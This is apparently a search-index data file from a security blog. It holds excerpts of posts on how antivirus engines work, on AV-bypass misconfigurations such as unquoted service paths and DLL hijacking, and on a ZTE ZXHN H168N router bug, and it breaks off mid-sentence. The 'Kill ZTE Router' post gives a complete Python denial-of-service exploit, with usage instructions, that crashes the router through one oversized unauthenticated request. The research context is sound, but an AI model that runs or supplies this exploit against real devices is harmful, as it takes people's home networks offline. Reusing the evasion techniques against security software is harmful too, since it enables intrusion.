var store = [{
        "title": "Bypass The Anti-Virus - Part 1: Introduction",
        "excerpt":"Introduction   AV (Anti-Virus) most of the common and widely used endpoint security softwares exist that almost used on both of individuals &amp; corporation Endpoints.Therefor, It’s a challenge for penetration testers/ethical hackers to run their tools/exploits “Which Consider as malicious softwares”. As a results, The AV software would be detecting the tools/exploits. But, Attackers are getting more smarter day by day. So, in this series we will discover and know about AV (Anti-Virus) software &amp; how to bypass it from scratch moving to more advanced ways.   Malwares &amp; Anti-Virus History   Viruses are the common keyword used between people. But, actually viruses are one type of the malware families &amp; types. So, what is “malware” ?. It’s a short term for “Malicious Software” as it’s name describing it as a coded and designed softwares to perform harmful activites on the system for example ( Unauthorized Access, Delete Important files, Lock the system, Encrypt Your data and many more). You might think malwares started from 10 or 20 years ago or as something new. But, The first malware came to life was on the 70’s specifically 1971 that year when The Creaper created and it was the first malware. And it was not performing any malicious or harmful activities. In fact, It was an experiment. So, you may be wondering what was The Creaper doing ?. Basically, It was just displaying a message to challenge the use to catch it. At that time also The Reaper was created and it was the first Anti-Virus “Anti-Malware” and the goal of creating it, Was to hunt for The Creaper malware and stop it. Since that time until now there were a lot of updates on the malwares from the attackers and on the endpoint security solutions from the vendors.   How Anti-Virus Works ?      Anti-Virus is a software like any other software we use. Therefor, it requires a lot of files and libraries to be loaded so the anti-virus software can work probebly and each got different functions and used in a spasific jobs. For example the file could be for Configuration,Database,Logging&amp;more. We gonna know more about these files &amp; libraries and how we could exploit them in this series. But the most important part here is to know how the anti-virus can detect and catch the malware and basically, the Anti-Virus dealing and scanning with the malware through the engines and we gonna know about each one of these engines &amp; how each one of them scan and deal the malware in different ways.   Anti-Virus Engines      Now, Time to discuss the engines of the Anti-Virus and see how each of them work:   Static Engine   First is the Static Engine and as we can guess from the name it’s scanning the malware statically by comparing it to a database of signatures that related to previous known malwares and check if there is a match with any of the signatures. Let’s take a deep look on the process.      Explaining the process in the above picture. We have the file we want to scan, The anti-virus take it and pass it or gonna use the Static Engine aganist it. Then, the Static Engine start to get the signatures and collect it all from the Signatures Database/File. After that, It will start to searching with the Signatures &amp; comparing it to the file. And if any matched signature found, It will mark the file as Malicious. Otherwise, It will mark the file as Benign which means non-malicious. So, You may got one of the ways to bypass this engine. By changing the malware form or code or anything could be exist in these signatures to avoid the detection from this engine. We will be talking about that in the coming parts.   Heuristic Engine   The Heuristic Engine is closer to the Static Engine but instead of using signatures. It’s using defined rules and these rules more close to the behaviour of the software and how is it acting and what it is doing. For example some Rules are If the software open outbound connection or Try to access some files in the system32 directory. If one of these rules matched with the software behaviour then it will be marked as a malicious software.      So, the process is as the following: The anti-virus take the file and pass it to the Heuristic Engine . Then, the Heuristic Engine start to collect the pre-defined rules . After that, It will start look into the file behaviour with these rules. And if any matched rule found, It will mark the file as Malicious. Otherwise, It will mark the file as Benign .   Unpacking Engine   This engine is not actually to scanning the file to see if it’s Malicious or Benign. So, what does it do ?. to understand the Unpacking Engine we have to know what is Packing &amp; Unpacking Actually.      What is Packing &amp; Unpacking ?   Packing or Software Packing is a method that used to compress the actual code for the software and this method used to protect the code from being reversed for the normal softwares . So, the Threat Actors Used the same way to protect their malwares and make it hard to be analyzed. If we executed the Packed file it will be loaded in the memory and during the RunTime process the file get Unpacked and executed. Read More Here for deep understanding.   Let’s move on to the Unpacking Engine process. But, before we go for it, You have to know that each Packing process is done by a Packing Softwares and each software Pack the file with different algorithm And to Unpacking the Packed file you without having the Packer it will be so hard. So, the malware analyst that analysis the malware start to Unpack it manually and then write a script to Unpack it. After that add it to the Unpacking Engine .      So, here we got the Packed file the anti-virus will pass it to the Unpacking Engine. Then, the Unpacking Engine gonna to check the Packed file to get the Packing Software that used to perform the packing. And finally it will perform Unpacking if it’s exist in the engine and give us the Unpacked File. Finally it’s the time to scan the Unpacked File.   Dynamic Engine  Finally, the Dynamic Engine. As the engine name says, It’s analyzing the Malware or the targeted software dynamically By Running the targeted file inside a sandbox and start to analysis it’ behaviour and see if it’s malicious or no. So, let’s dig more deep into the dynamic engine. The Dynamic Engine has more than 1 way to scan for the malware as the following:      Sandboxing So first what is Sandboxing ? It’s a process of running the file/software inside a virtual testing environment. Therefor, the code or the software would be run will be separated from the real environment “Operating System”. In this way if the software is malicious it won’t affect your “Operating System”. As a result the Dynamic Engine will be able to know if its malicious or no through its suspicious behaviour.   API Monitoring What is windows APIs ? It’s a set of functions that used by softwares/programes to perform some tasks such as Crreating New Files,Delete Files,ReadFiles &amp; many more. There are some of these APIs commonly used by threat actors malwares. So, the Dynamic Engine is inspecting the API calls of the software and analysis it, looking for some common used API calls that widely used by the malwares. You can see the common malwarews API calls from Here.      As the process shown, The anti-virus take the file and pass it to the Dynamic Engine. After thatDynamic Engine will start to analysis the file by Sandboxing/ API Monitoring after that It will mark the file as Malicious Based on the analysis. Otherwise, It will mark the file as Benign which means non-malicious.   Conclusion  Overall, Nowadays we can see a massive updates in security solutions such as implementing the Artificial intelligence &amp; Machine Learning. Which making it harder for attackers to bypass the solution or the AV software. Finally, as the solutions getting smarter also, the attackers getting smarter too with their Techniques &amp; Attacks. In the coming parts we will discuss about the Common Misconfiguration, Techniques &amp; Attacks to bypass the Anti-Virus.  ","categories": ["Defense Evasion"],
        "tags": [],
        "url": "http://localhost:5000/defense%20evasion/BypassAV1/",
        "teaser": "http://localhost:5000/assets/images/clasoxyjk07nb0lo1gg0j8xg4.png"
      },{
        "title": "Bypass The Anti-Virus - Part 2: Common Misconfigurations, Techniques & Attacks",
        "excerpt":"Introduction  After the basics we discuss in the previous part of this series. Now, it’s the time to move forward and know about the Misconfigurations, Techniques &amp; Attacks that can affect the anti-virus. Taking the Misconfigurations topic first. To be more clear, Any software could have some misconfigurations during the development &amp; implementation of the software. Therefor, as the anti-virus also a software it can be affected to the misconfigurations we will discuss.  Insecure Permissions  Insecure Permissions Occaures when a low-privileges user “Non-Administrators” get permissions he doesn’t suppose to have it. Before the example the permissions are as the following Read,Write,Execute and could be all “Full Control”.     Read: View &amp; Ability to read a file and it’s containt   Write: Ability to write “Edit” and modify.   Execute: Ability to execute and run the file/program.      So, any of these misconfigurations related to the permissions known as Insecure Permissions can result in Reading, Wrting &amp; Executing on sensitive files and programs for example:     Insecure Read permissions could apper in reading configuration files of the anti-virus as an example.   Insecure Write permissions could apper in modifying the anti-virus configuration files or the affected files at all. For example the Signatures Database file could be deleted or making it empty therefore the Static Engine will fail to detecting the malware.   Insecure Execute permissions can lead to executing of dangerous executables like uinstall program which will lead to remove the anti-virus.     Improper Privileges             Another misconfiguration is Improper Privileges and here the software “Anti-Virus” itself doesn’t check for the user privileges (If ths user is allowed or not). As a results that will let a non-privileged user to access/modify the software and its related components.This type of misconfigurations could also lead to Privilige Escalation. You can read about Improper Privileges from here. And you can see somecases found in some Endpoint Security Softwares: Bitdefender, McAfee,.   Unquoted Service Path  The Unquoted Service Path is one of the misconfiguration on the Windows Platform and this kind of misconfigurations is well-known, because it’s widely used to Escalate Priviliges. Let’s Explain the idea behind the service path more to make it clear. When we create a windows service manually or when we install a software, The software create some services that are responable to run some binaries or some files when the service boot-up, Therefor, the software can work well without any problems as each service run a specific binary or file that has specific funcation/operation in the anti-virus.   We can search for the Services App in the taskbar search:    After open it we can open any services to explain how it works:    In the Above picture you can see that we got 2 Services with the following 2 paths under Path to executable or as it called binpath:     Eddie Services: C:\\Program Files\\AirVPN\\Eddie-Service-Elevated.exe   ESET Services: \"C:\\Program Files\\ESET\\ESET Security\\ekrn.exe\"   So, As you can see the Eddie Services  has the path without any quotes like '' or \"\". Unlike ESET Services has double quotes \"\". Now, Why do we need to put the path inside quotes ?. To know the answer let’s explain how Windows execute the Service binary. When there are spaces in the path, Windows try to execute the path as the following:   Taking the following path for example C:\\Program Files\\vsociety software\\run.exe. Basiclly, as there is no qoutes, It will replace the spaces and read it as a path and would add .exe to it and try to execute it if not exist will move to the next one until the end of the path reached.   Process example as the following for the pervious 2 paths:     C:\\Program Files\\vsociety software\\run.exe:            C:\\Program.exe: If not exist the following step:       C:\\Program Files\\vsociety.exe:  If not exist the it will run the original one which is the following       C:\\Program Files\\vsociety software\\run.exe: it will run as its the targeted original existing file.           As we saw if a malicious user created a file called a malicious file called Program.exe under C directory. the service will execute it. As a results, it will launch the malicious file instead of the targeted service file. Therefor, it could lead to stop some features in the anti-virus as the service binary is important and needed to start some protections.      \"C:\\Program Files\\vsociety software\\run.exe\": the qouted path cancel the spaces part and tell that this is a full path.   DLL Hijacking  A DLL (Dynamic-link library) file is a library can be found in windows and it’s contains functions and codes that do a spesific task to do. Basically, works as any other library exist. These DLLs can be hijacked and trick the software to load a DLL file created by the malicious user which gonna lead to a damage or to make the software loss some features. In case of Anti-Virus, It could be an important library to do some scans or detect malware. As a results, it’s gonna lead to a bypass.   DLL Hijacking got a lot of types as the following:      DLL replacement: replace a legitimate DLL with an evil DLL. This can be combined with DLL Proxying , which ensures all functionality of the original DLL remains intact.   DLL search order hijacking: DLLs specified by an application without a path are searched for in fixed locations in a specific order. Hijacking the search order takes place by putting the evil DLL in a location that is searched in before the actual DLL. This sometimes includes the working directory of the target application.   Phantom DLL hijacking: drop an evil DLL in place of a missing/non-existing DLL that a legitimate application tries to load.   DLL redirection: change the location in which the DLL is searched for, e.g. by editing the %PATH% environment variable, or .exe.manifest / .exe.local files to include the folder containing the evil DLL.   WinSxS DLL replacement: replace the legitimate DLL with the evil DLL in the relevant WinSxS folder of the targeted DLL. Often referred to as DLL side-loading.   Relative path DLL Hijacking: copy (and optionally rename) the legitimate application to a user-writeable folder, alongside the evil DLL. In the way this is used, it has similarities with (Signed) Binary Proxy Execution. A variation of this is (somewhat oxymoronically called) ‘bring your own LOLbin’ in which the legitimate application is brought with the evil DLL (rather than copied from the legitimate location on the victim’s machine).   The above types from hacktricks. And also you could read more about the DLL Hijacking itself from the same link.   Conclusion  We have learned about simple and little 4 of the Misconfigurations that could be used to bypass the anti-virus software, There are many and more other ways can be used to bypass the anti-virus software. These Misconfigurations, Techniques &amp; Attacks  we will be discussed in the coming parts. Always don’t forget to take a look around the outlines and understand more. But, at all we gonna go deep when we come to part 5 of the series, where we gonna start to attack our Victim (Anti-Virus software vendor).  ","categories": ["Defense Evasion"],
        "tags": [],
        "url": "http://localhost:5000/defense%20evasion/BypassAV2/",
        "teaser": "http://localhost:5000/assets/images/clca7x8tt5teb0jrvefkubwhb.png"
      },{
        "title": "Exploit Writing (KILLx108): Kill ZTE Router ",
        "excerpt":"Introduction  After we had a lot  of information and understand where is the bug in the previous research (You can read it from here). Now, It’s time to exploit it and create an exploit.   The Exploit  It’s time to explain how to exploit it. So, previously it seems to be parsing the XML request we send and exposing information about Objects/Parameters and their values. and whatever XML  request we send it’s back with the same information. But, even tho we can not access these information if we are not authenticated. But, It’s still parsing our request if we are not authenticated. So, Let’s try our large value again here. And if we did that we will triage a crash in the router.      First we imported the needed libraries we going to use     import random import string import sys import urllib3 import requests           requests: to send our request exploit to the target.   urllib3: I used it here to diable the warings.   sys: to take arguments from the user through the command line.   string: to use it for the random library in generating the payload.   random: to create a payload with random strings from the strings library.     Second part a function taking 2 arguments     def attack(target, porot):    url = f\"{porot}://{target}/common_page/Localnet_WlanBasicAd_WLANSSIDConf_EncryOption_lua.lua\"   try:       print(\"[+] Check if the target is alive\")       check = requests.get(url, timeout=10, verify=False)       if check.status_code == 200 or 301 or 302 or 303:           print(\"[+] Target is alive\")           print(\"[+] Sending request...\")           create = string.ascii_uppercase           payload = ''.join(random.choice(create) for i in range(100000))           cookies = {\"_TESTCOOKIESUPPORT\": \"1\"}           Headers = {\"Connection\": \"close\",                      \"sec-ch-ua\": \"\\\"Google Chrome\\\";v=\\\"87\\\", \\\" Not;A Brand\\\";v=\\\"99\\\", \\\"Chromium\\\";v=\\\"87\\\"\",                      \"Accept\": \"application/xml, text/xml, */*; q=0.01\", \"X-Requested-With\": \"XMLHttpRequest\",                      \"sec-ch-ua-mobile\": \"?0\",                      \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\",                      \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\",                      \"Origin\": \"https://192.168.1.1\", \"Sec-Fetch-Site\": \"same-origin\", \"Sec-Fetch-Mode\": \"cors\",                      \"Sec-Fetch-Dest\": \"empty\", \"Referer\": \"https://\"+target+\"/\", \"Accept-Encoding\": \"gzip, deflate\",                      \"Accept-Language\": \"en-US,en;q=0.9\"}           Data = f\"&lt;ajax_response_xml_root&gt;&lt;INSTIDENTITY&gt;{payload}&lt;/INSTIDENTITY&gt;&lt;/ajax_response_xml_root&gt;\"           Basically, This function will take 2 arguments which is protocol, ethier is http or https and the target you want to exploit it. Then, it will check if the target alive and responded or no. After that in the following lines:  create = string.ascii_uppercase payload = ''.join(random.choice(create) for i in range(100000))  it will create a random 100000 length of strings to send it with the request and crash the device.      Full code:              import random import string import sys import urllib3 import requests       urllib3.disable_warnings()   def attack(target, porot):   url = f\"{porot}://{target}/common_page/Localnet_WlanBasicAd_WLANSSIDConf_EncryOption_lua.lua\" try:     print(\"[+] Check if the target is alive\")     check = requests.get(url, timeout=10, verify=False)     if check.status_code == 200 or 301 or 302 or 303:         print(\"[+] Target is alive\")         print(\"[+] Sending your request...\")         create = string.ascii_uppercase         payload = ''.join(random.choice(create) for i in range(100000))         cookies = {\"_TESTCOOKIESUPPORT\": \"1\"}         Headers = {\"Connection\": \"close\",                    \"sec-ch-ua\": \"\\\"Google Chrome\\\";v=\\\"87\\\", \\\" Not;A Brand\\\";v=\\\"99\\\", \\\"Chromium\\\";v=\\\"87\\\"\",                    \"Accept\": \"application/xml, text/xml, */*; q=0.01\", \"X-Requested-With\": \"XMLHttpRequest\",                    \"sec-ch-ua-mobile\": \"?0\",                    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\",                    \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\",                    \"Origin\": \"https://192.168.1.1\", \"Sec-Fetch-Site\": \"same-origin\", \"Sec-Fetch-Mode\": \"cors\",                    \"Sec-Fetch-Dest\": \"empty\", \"Referer\": \"https://\"+target+\"/\", \"Accept-Encoding\": \"gzip, deflate\",                    \"Accept-Language\": \"en-US,en;q=0.9\"}         Data = f\"&lt;ajax_response_xml_root&gt;&lt;INSTIDENTITY&gt;{payload}&lt;/INSTIDENTITY&gt;&lt;/ajax_response_xml_root&gt;\"         try:             att = requests.post(url, headers=Headers, cookies=cookies, data=Data, verify=False, timeout=5)             print(\"[-] Target is not Vulnerable\")             sys.exit()         except requests.exceptions.Timeout:             print(\"[+] Target vulnerable and dead now\")          print(\"[+] Exploit by: Zeyad Azima\")      else:         print(\"[-] Your Target is not Alive\") except Exception as error:     print(\"[-]\", error)    try:     if sys.argv[2] == “http” or “https”:         attack(sys.argv[1], sys.argv[2])     else:         print(“[-] Please enter a valid protocol (http or https)”)   except IndexError:     print(“[-] Please Set your target \\n ex: exploit.py target protocol”)   - Usage  python3 exploit.py IP http/s ```      Conclusion  At the end, it was a simple bug, But it’s lead to take the device down. The exploit works with the other new and updated versions. You can see the full code here on github.  ","categories": ["IoT Exploitation"],
        "tags": [],
        "url": "http://localhost:5000/iot%20exploitation/exploitzte/",
        "teaser": "http://localhost:5000/assets/images/clchdo96yeclu0jp8gj7mf54a.png"
      },{
        "title": "Research: Kill the Router with one request",
        "excerpt":"Introduction  I discoverd a bug while playing around with the ZXHN H168N V3.5 home router device which result in killing the router and make it go down with one request. So, If you want to get the device alive again, You have to restart it or wait for hours. Let’s go and explain it.   Spotting the Bug  I was doing the test as a blackbox without looking into hte firmware (We will look at the firmware later). First go to your device dashboard and login. Then, go to Local network tab. After that move to WLAN. Finally for sure don’t forget your Burp Suite tool, Since we doing the test on the web Application interface level. So, we be able to intercept the requests and play around with it. As the following step showed in the bellow picture: open any of the WLAN SSID and click on save.      But, before this open burp suite to intercept the request.      Now, i will send the request to the repeater to explain the vulnerability, by press right click and choose send to repeater :      Let’s go to the repeater tab and play with the request, You will see the request then click go:      So, Let’s explain what actual happened and what the request doing and what is the response for it. The request is about modifying the WLAN settings and You can see in the response tab, In the body you can see the XML response from server and has many objects, as example the &lt;INSTIDENTITY&gt; you will see that this object has a value “DEV.WIFI.AP1.PSK1”, it looks like a value refering to WIFI Access point 1, Casue as you saw before we had 2 Access points in the router.   Now, we have XML response in this web application, We will try XXE (iNJECTING SOME xml body to check for it). I even take the response and send it back as a request.   When, I did that it’s actually back to me with more information about the Parameters and each value for each Paramenter as you can see in the below screenshot.      I tried other payloads related to XXE ,. But, non of payloads worked. So, This bug is limited. Now, this bug is authenticated, When we are not authenticated it will not show any information. But, it will parse our request without any problems.   Under The Hood  Now, We will take a static look at the backend code to understand more. So, what we need now is the Firmware for the device and we have many ways to do it:      You can search for the firmware on the official website for the vendor.   Download it from any other source (after someone already dump it from the device and published it).   Dump the firmware through URAT, You could read a detailed blog from Here.   Finally dumping the firmware using CH341A Mini programmer USB, You could read a detailed blog from Here.   In my case, I found that someone dump it before, Therefor, i download it. Now, Let’s extract the firmware using Binwalk tool and discover the firmware files. Specially the vulnerable end-point file.      Extracting the firmware: binwalk -e firmware. The -e is for extracting.      In the above screenshot it’s done successfully and we extracted the firmware as we can see in the following picature, we moved to the firmware extracted directory:      Now, if we go to the /squashfs-root directory, We can see the directory to all the Linux system directories which the firmware router system built-on. Under the /home directory we will find the /httpd directory which home directory for the web service user that hosting the web-interface for the router. (You can see on the following picature)      Now, backing to the URL of the end-point we were testing, /common_page/Localnet_WlanBasicAd_WLANSSIDConf_EncryOption_lua.lua. It’s clearly the interface written in Lua programming language. Let’s move on to our vulnerable page under /common_page directory. If we list the files in the directory and grep the first words from the page name we can see the following:      We can see that the page full name is not here (It may be a one old step realse from the actual one we do have). So, I will pick up the Localnet_WlanBasicAd_WLANSSIDConf_lua.lua which is the closer one to our page and if we checked the file using file command, We will be able to see that it’s a Lua, ByteCode, Version 5.1:      If we tried to read the file using cat command, the output will be non-understandable representation:      Lua ByteCode  As we saw before the file is Lua ByteCode. After a couple hours of search, I was able to find this website to decompile Lua ByteCode. Therefor, we will be able to analysis and understand what happen in the background.      We can see that we have a lot of code here and if we scroll down you gonna see some instructions looks like Assembly, After searching for the Lua Bytecode. I found the follwoing reference with the instructions and description for each instruction:      So, Now we can start to read and understand. If we take a look at the first few lines it’s giving us information about the language version, etc. But, the starting part where we can see the main function and it’s information:   ************ Main Function Source: @/home/xialei/Builds/H168NV31_Develop_BaseCSP3005P01/chip_mtk7510/product/H168NV31_BELT/scripts/../basefilesystem/luapages/html//common_page/Localnet_WlanBasicAd_WLANSSIDConf_lua.lua Parameters: 0 Is vararg: yes Local variable 'arg': absent VM registers needed: 36      Source: The source code file directory (Which also seems from the firmware team developers under /home).   Parameters: Number of functions parameters.   Is Vrarg: Meaning it can accept a variable number of arguments.   Local variable 'arg': absent:is a special variable in Lua that refers to a list of arguments passed to a function.   VM registers needed: 36: Requirted VM Registers to execute.]   Under the main functions we can find 2 things Constants which are variables and can not be changed, Also Locals which are defined local variables.      Constants     Constants: 61 +0658:Size=7: 72 65 71 75 69 72 65            Const#1   string    \"require\" +0665:Size=E: 6C 69 62 2F 63 6F 6D 6D 6F...   Const#2   string    \"lib/common_lua\" +0679:Size=0:                                 Const#3   string    \"\" +067F:Size=A: 49 46 5F 45 52 52 4F 52 49 44   Const#4   string    \"IF_ERRORID\" +068B:Size=8: 00 00 00 00 00 00 00 00         Const#5   float     0.0 +0694:Size=8: 3F F0 00 00 00 00 00 00         Const#6   float     1.0 +06A1:Size=6: 63 67 69 6C 75 61               Const#7   string    \"cgilua\" +06AD:Size=B: 72 65 6D 6F 74 65 5F 61 64...   Const#8   string    \"remote_addr\" +06BE:Size=B: 73 65 73 73 69 6F 6E 5F 67...   Const#9   string    \"session_get\" +06CF:Size=5: 52 69 67 68 74                  Const#10  string    \"Right\" +06DA:Size=11: 4F 42 4A 5F 57 4C 41 4E 4...   Const#11  string    \"OBJ_WLANCONFIG_ID\" +06F1:Size=1: 33                              Const#12  string    \"3\" +06F8:Size=5: 45 53 53 49 44                  Const#13  string    \"ESSID\" +0703:Size=A: 42 65 61 63 6F 6E 54 79 70 65   Const#14  string    \"BeaconType\" +0713:Size=B: 57 45 50 41 75 74 68 4D 6F...   Const#15  string    \"WEPAuthMode\" +0724:Size=B: 57 45 50 4B 65 79 49 6E 64...   Const#16  string    \"WEPKeyIndex\" +0735:Size=B: 57 50 41 41 75 74 68 4D 6F...   Const#17  string    \"WPAAuthMode\" +0746:Size=E: 57 50 41 45 6E 63 72 79 70...   Const#18  string    \"WPAEncryptType\" +075A:Size=B: 31 31 69 41 75 74 68 4D 6F...   Const#19  string    \"11iAuthMode\" +076B:Size=E: 31 31 69 45 6E 63 72 79 70...   Const#20  string    \"11iEncryptType\" +077F:Size=6: 45 6E 61 62 6C 65               Const#21  string    \"Enable\" +078B:Size=D: 57 50 41 47 72 6F 75 70 52...   Const#22  string    \"WPAGroupRekey\" +079E:Size=F: 45 53 53 49 44 48 69 64 65...   Const#23  string    \"ESSIDHideEnable\" +07B3:Size=12: 56 61 70 49 73 6F 6C 61 7...   Const#24  string    \"VapIsolationEnable\" +07CB:Size=8: 50 72 69 6F 72 69 74 79         Const#25  string    \"Priority\" +07D9:Size=A: 4D 61 78 55 73 65 72 4E 75 6D   Const#26  string    \"MaxUserNum\" +07E9:Size=11: 4F 42 4A 5F 57 4C 41 4E 5...   Const#27  string    \"OBJ_WLANWEPKEY_ID\" +0800:Size=6: 57 45 50 4B 65 79               Const#28  string    \"WEPKey\" +080C:Size=E: 4F 42 4A 5F 57 4C 41 4E 50...   Const#29  string    \"OBJ_WLANPSK_ID\" +0820:Size=D: 4B 65 79 50 61 73 73 70 68...   Const#30  string    \"KeyPassphrase\" +0833:Size=19: 51 75 65 72 79 57 43 61 7...   Const#31  string    \"QueryWCardAndSSIDIdentity\" +0852:Size=4: 50 4F 53 54                     Const#32  string    \"POST\" +085C:Size=9: 49 46 5F 41 43 54 49 4F 4E      Const#33  string    \"IF_ACTION\" +086B:Size=9: 5F 57 45 50 43 4F 4E 49 47      Const#34  string    \"_WEPCONIG\" +087A:Size=9: 5F 50 53 4B 43 4F 4E 49 47      Const#35  string    \"_PSKCONIG\" +0889:Size=7: 5F 49 6E 73 74 49 44            Const#36  string    \"_InstID\" +0896:Size=C: 5F 49 6E 73 74 49 44 5F 57...   Const#37  string    \"_InstID_WEP0\" +08A8:Size=C: 5F 49 6E 73 74 49 44 5F 57...   Const#38  string    \"_InstID_WEP1\" +08BA:Size=C: 5F 49 6E 73 74 49 44 5F 57...   Const#39  string    \"_InstID_WEP2\" +08CC:Size=C: 5F 49 6E 73 74 49 44 5F 57...   Const#40  string    \"_InstID_WEP3\" +08DE:Size=B: 5F 49 6E 73 74 49 44 5F 50...   Const#41  string    \"_InstID_PSK\" +08EF:Size=E: 74 72 61 6E 73 54 6F 50 6F...   Const#42  string    \"transToPostTab\" +0903:Size=10: 74 72 61 6E 73 54 6F 46 6...   Const#43  string    \"transToFilterTab\" +0919:Size=5: 41 70 70 6C 79                  Const#44  string    \"Apply\" +0924:Size=1: 59                              Const#45  string    \"Y\" +0927:Size=0:                                 Const#46  nil       nil +092C:Size=13: 61 70 70 6C 79 4F 72 4E 6...   Const#47  string    \"applyOrNewOrDelInst\" +0945:Size=8: 57 45 50 4B 65 79 30 30         Const#48  string    \"WEPKey00\" +0953:Size=8: 57 45 50 4B 65 79 30 31         Const#49  string    \"WEPKey01\" +0961:Size=8: 57 45 50 4B 65 79 30 32         Const#50  string    \"WEPKey02\" +096F:Size=8: 57 45 50 4B 65 79 30 33         Const#51  string    \"WEPKey03\" +097D:Size=6: 43 61 6E 63 65 6C               Const#52  string    \"Cancel\" +0989:Size=12: 67 65 74 53 70 65 63 69 6...   Const#53  string    \"getSpecificInstXML\" +09A1:Size=5: 74 61 62 6C 65                  Const#54  string    \"table\" +09AC:Size=6: 69 6E 73 65 72 74               Const#55  string    \"insert\" +09B8:Size=F: 53 53 49 44 46 69 6C 74 65...   Const#56  string    \"SSIDFilterByNIC\" +09CD:Size=D: 67 65 74 41 6C 6C 49 6E 73...   Const#57  string    \"getAllInstXML\" +09E0:Size=3: 49 47 44                        Const#58  string    \"IGD\" +09E9:Size=6: 63 6F 6E 63 61 74               Const#59  string    \"concat\" +09F5:Size=E: 6F 75 74 70 75 74 45 72 72...   Const#60  string    \"outputErrorXML\" +0A09:Size=9: 6F 75 74 70 75 74 58 4D 4C      Const#61  string    \"outputXML\"           As you can see we have 3 fields:     Const#&lt;number&gt;: the Constant variable number.   &lt;Type&gt;: The variable data type (e.x:Float,stringm etc).   &lt;Name&gt;: The variable name.   Now, to the Locals variables:     Locals     Locals: 29 Local#1   R0   def:&lt;4&gt;    scope:&lt;5..349&gt;      name: InstXML Local#2   R1   def:&lt;5&gt;    scope:&lt;6..349&gt;      name: ErrorXML Local#3   R2   def:&lt;6&gt;    scope:&lt;7..349&gt;      name: OutXML Local#4   R3   def:&lt;7&gt;    scope:&lt;9..349&gt;      name: tError Local#5   R4   def:&lt;9&gt;    scope:&lt;10..349&gt;     name: need2Get Local#6   R5   def:&lt;10&gt;   scope:&lt;11..349&gt;     name: xmlStr Local#7   R6   def:&lt;12&gt;   scope:&lt;13..349&gt;     name: sess_id Local#8   R7   def:&lt;16&gt;   scope:&lt;17..349&gt;     name: uRight Local#9   R8   def:&lt;17&gt;   scope:&lt;18..349&gt;     name: PARA Local#10  R9   def:&lt;18&gt;   scope:&lt;19..349&gt;     name: FP_OBJNAME Local#11  R10  def:&lt;50&gt;   scope:&lt;51..349&gt;     name: WEP_OBJNAME Local#12  R11  def:&lt;51&gt;   scope:&lt;54..349&gt;     name: WEP_PARA Local#13  R12  def:&lt;54&gt;   scope:&lt;55..349&gt;     name: PSK_OBJNAME Local#14  R13  def:&lt;55&gt;   scope:&lt;58..349&gt;     name: PSK_PARA Local#15  R14  def:&lt;58&gt;   scope:&lt;59..349&gt;     name: WLANNICNum Local#16  R15  def:&lt;59&gt;   scope:&lt;60..349&gt;     name: WNICIdentity Local#17  R16  def:&lt;60&gt;   scope:&lt;61..349&gt;     name: WLANBasicIDTable Local#18  R17  def:&lt;68&gt;   scope:&lt;69..349&gt;     name: FP_ACTION Local#19  R18  def:&lt;71&gt;   scope:&lt;72..349&gt;     name: _WEPCONIG Local#20  R19  def:&lt;74&gt;   scope:&lt;75..349&gt;     name: _PSKCONIG Local#21  R20  def:&lt;77&gt;   scope:&lt;78..349&gt;     name: FP_IDENTITY Local#22  R21  def:&lt;80&gt;   scope:&lt;81..349&gt;     name: WEP_IDENTITY0 Local#23  R22  def:&lt;83&gt;   scope:&lt;84..349&gt;     name: WEP_IDENTITY1 Local#24  R23  def:&lt;86&gt;   scope:&lt;87..349&gt;     name: WEP_IDENTITY2 Local#25  R24  def:&lt;89&gt;   scope:&lt;90..349&gt;     name: WEP_IDENTITY3 Local#26  R25  def:&lt;92&gt;   scope:&lt;93..349&gt;     name: PSK_IDENTITY Local#27  R26  def:&lt;93&gt;   scope:&lt;94..349&gt;     name: xmlTable Local#28  R27  def:&lt;96&gt;   scope:&lt;97..349&gt;     name: WEP_PARA_POST Local#29  R28  def:&lt;99&gt;   scope:&lt;100..349&gt;    name: WEP_PARA_FILTER           Here we can see that there are 5 fields:      Local#&lt;number&gt;: The Local variable number.   R&lt;number&gt;: The register that the variable assigned to.   def:&lt;number&gt;: Line that the variable defined on, In the code.   scope:&lt;ramge&gt;: indicates that the variable is in scope (can be accessed and modified) from a range of lines in the code.   &lt;Name&gt;: Finally the variable name.   If we take a look at the Constants &amp; Local variable names including the same parameters in our request.:  IF_ACTION | Const#33  string    \"IF_ACTION\" Enable | Const#21  string    \"Enable\" _InstID | Const#36  string    \"_InstID\" _PSKCONIG | Local#20  R19  def:&lt;74&gt;   scope:&lt;75..349&gt;     name: _PSKCONIG BeaconType | Const#14  string    \"BeaconType\" WPAAuthMode | Const#17  string    \"WPAAuthMode\" 11iAuthMode | Const#19  string    \"11iAuthMode\" WPAEncryptType | Const#18  string    \"WPAEncryptType\" 11iEncryptType | Const#20  string    \"11iEncryptType\" _InstID_PSK | Const#41  string    \"_InstID_PSK\" ESSID | Const#13  string    \"ESSID\" ESSIDHideEnable | Const#23  string    \"ESSIDHideEnable\" KeyPassphrase | Const#30  string    \"KeyPassphrase\"  and many more parameters......      Note: you could find differents in files becuase of the firmware version &amp; realse   Also there are some cariables has the XML name in as the following which explains the XML format type:    Local#1   R0   def:&lt;4&gt;    scope:&lt;5..349&gt;      name: InstXML   Local#2   R1   def:&lt;5&gt;    scope:&lt;6..349&gt;      name: ErrorXML   Local#3   R2   def:&lt;6&gt;    scope:&lt;7..349&gt;      name: OutXML   Local#6   R5   def:&lt;10&gt;   scope:&lt;11..349&gt;     name: xmlStr   Local#27  R26  def:&lt;93&gt;   scope:&lt;94..349&gt;     name: xmlTable   Now, backing to the request again as the _InstID is a Const variable. It has a value in the request as we can see, But when we try to change the value. It’s giving us error:          Before changing the value             After Changing the value, It’s giving an error.             Here Trying to flow it with huge value to get any crash, andIt didn’t work.        Final Thoughts  As we didn’t do any dynamic analysis. Cause it will require us to emulate the firmware and debug it,To make everything clear. But, there are a logical posability that the bug in the following line:  GETTABLE 20 20 -36     &lt;77&gt;   R20@FP_IDENTITY = R20[\"_InstID\"]   Let’s explain the line first the  GETTABLE operation is used to retrieve a value from a table which in this case is the XMLtable and it will retrive the value stored in the key _InstID and store it into FP_IDENTITY that holded at R20. In this case, As we pass a 